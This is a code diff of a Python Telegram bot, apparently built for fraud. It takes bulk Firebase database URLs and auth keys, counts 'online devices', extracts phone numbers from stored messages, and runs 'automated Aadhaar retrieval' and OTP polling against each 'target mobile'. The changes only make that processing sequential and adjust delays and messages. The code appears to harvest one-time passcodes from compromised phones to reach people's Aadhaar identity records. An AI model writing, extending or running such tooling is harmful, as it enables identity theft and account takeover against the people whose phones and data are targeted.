@@ -654,7 +654,7 @@ def handle_admin_callbacks(call):
         bot.send_message(
             chat_id,
             "⚡ <b>Auto Firebase Automation</b>\n\n"
-            "👇 Kripya apne <b>Firebase Realtime Database URL(s)</b> paste karein (bulk links & auth keys supported). Bot sabhi links scan karega, combined online devices count karega aur automatically process karega:\n\n"
+            "👇 Kripya apne <b>Firebase Realtime Database URL(s)</b> paste karein (bulk links & auth keys supported). Bot sabhi links scan karega, combined online devices count karega aur ek-ek karke sequentially process karega:\n\n"
             "Type <b>Cancel</b> to abort.",
             reply_markup=cancel_markup,
             parse_mode='HTML'
@@ -1315,7 +1315,7 @@ def handle_all(message):
         return
     text = message.text.strip()
 
-    # --- AUTO FIREBASE BOT AUTOMATION INTERCEPTOR (BULK URL PARSING & PROCESSING) ---
+    # --- AUTO FIREBASE BOT AUTOMATION INTERCEPTOR (BULK URL PARSING & SEQUENTIAL PROCESSING) ---
     if state.get('step') == 'AWAITING_AUTO_FIREBASE_LINK':
         if text.lower() == 'cancel':
             user_states[chat_id] = {'step': 'IDLE'}
@@ -1410,7 +1410,7 @@ def handle_all(message):
                     f"🔗 <b>Total Checked URLs:</b> <code>{len(urls)}</code>\n"
                     f"🟢 <b>Combined Total Online / Active Devices:</b> <code>{total_online_all}</code>\n"
                     "━━━━━━━━━━━━━━━━━━━━━━\n"
-                    "⚡ <i>Executing automated Aadhaar retrieval & 40s timeout OTP polling across all combined databases...</i>",
+                    "⚡ <i>Executing automated Aadhaar retrieval & 40s timeout OTP polling strictly <b>one by one sequentially</b>...</i>",
                     parse_mode='HTML'
                 )
 
@@ -1427,6 +1427,7 @@ def handle_all(message):
                         except Exception:
                             continue
                         
+                        # Robust phone extraction matching gif2.py logic
                         phone_number = None
                         text_data = str(msgs)
                         cleaned_text = re.sub(r'[\s\-]', '', text_data)
@@ -1437,7 +1438,7 @@ def handle_all(message):
                         if not phone_number:
                             continue
 
-                        bot.send_message(chat_id, f"🎯 Auto-processing target mobile: <code>{phone_number}</code>", parse_mode='HTML')
+                        bot.send_message(chat_id, f"🎯 Processing target mobile sequentially: <code>{phone_number}</code>", parse_mode='HTML')
                         
                         os.environ['FIREBASE_URL'] = full_item
 
@@ -1447,14 +1448,15 @@ def handle_all(message):
                             loop
                         )
                         try:
+                            # Wait strictly until this number finishes completely before moving to the next
                             future.result(timeout=600)
                             total_processed += 1
                         except Exception as ex:
                             print(f"⚠️ [AUTO-FIREBASE] Task execution error for {phone_number}: {ex}")
                         
-                        time.sleep(2)
+                        time.sleep(3)
 
-                bot.send_message(chat_id, f"✅ <b>Auto Firebase finished! Successfully processed {total_processed} numbers across all combined databases.</b>", parse_mode='HTML')
+                bot.send_message(chat_id, f"✅ <b>Auto Firebase finished! Successfully processed {total_processed} numbers sequentially.</b>", parse_mode='HTML')
             except Exception as e:
                 bot.send_message(chat_id, f"❌ Auto Firebase Error: {esc(e)}")
 
